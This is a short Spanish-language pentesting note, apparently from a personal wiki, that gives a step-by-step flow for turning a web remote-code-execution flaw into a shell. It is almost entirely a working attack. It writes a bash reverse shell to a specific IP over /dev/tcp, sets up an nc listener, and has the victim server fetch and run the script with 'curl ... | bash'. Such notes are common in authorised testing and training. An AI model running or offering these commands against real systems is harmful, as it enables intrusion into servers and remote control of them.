---
tags: [web, rev-shell, rce]
status: done
platform: linux
---

# Reverse Shell desde RCE Web

> Flujo estándar para obtener shell desde un RCE en aplicación web.

---

## Hostear la rev shell en el VPS

```bash
# Crear el script en el VPS
cat > /var/www/html/rev.sh << 'EOF'
#!/bin/bash
sh -i >& /dev/tcp/145.239.181.13/443 0>&1
EOF
```

## Listener en el VPS

```bash
nc -lvnp 443
```

## Ejecución en el servidor víctima (desde RCE)

```bash
curl http://145.239.181.13/rev.sh | bash
```

---

## Ver también

- [[Reverse Shells]] — referencias de payloads por lenguaje
